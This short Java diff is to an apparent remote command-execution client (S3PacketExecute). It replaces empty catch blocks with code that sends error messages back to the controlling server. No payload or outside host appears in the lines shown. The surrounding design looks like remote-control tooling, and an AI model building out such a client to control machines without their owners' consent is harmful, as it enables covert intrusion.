@@ -55,8 +55,14 @@ public class S3PacketExecute implements IPacket
 				if(Client.instance.running)
 					Client.instance.outputStream.writeObject(new C1PacketMessage(command));
 			}
-			catch (Exception e) {}
+			catch (Exception e)
+			{
+				Client.instance.outputStream.writeObject(new C1PacketMessage("error: " + e.getMessage()));
+			}
 		}
-		catch (Exception e) {}
+		catch (Exception e)
+		{
+			Client.instance.outputStream.writeObject(new C1PacketMessage("error: " + e.getMessage()));
+		}
 	}
 }
